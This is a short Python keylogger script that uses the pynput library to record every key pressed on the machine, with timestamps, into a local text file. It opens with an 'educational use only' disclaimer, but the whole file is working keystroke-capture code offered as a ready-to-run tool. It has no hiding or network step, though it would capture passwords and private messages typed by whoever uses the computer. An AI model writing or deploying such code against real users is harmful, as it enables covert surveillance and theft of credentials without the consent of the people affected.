# DISCLAIMER: This tool is for EDUCATIONAL USE ONLY.  
# Do NOT use it on systems without explicit permission.

from pynput.keyboard import Listener
import datetime

# File to save keystrokes
log_file = "keystrokes.txt"

def on_press(key):
    try:
        # Log the key pressed
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} - Key Pressed: {key.char}\n")
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl)
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} - Special Key Pressed: {key}\n")

def start_keylogger():
    print("Keylogger started. Press Ctrl+C to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()

# Start the keylogger
start_keylogger()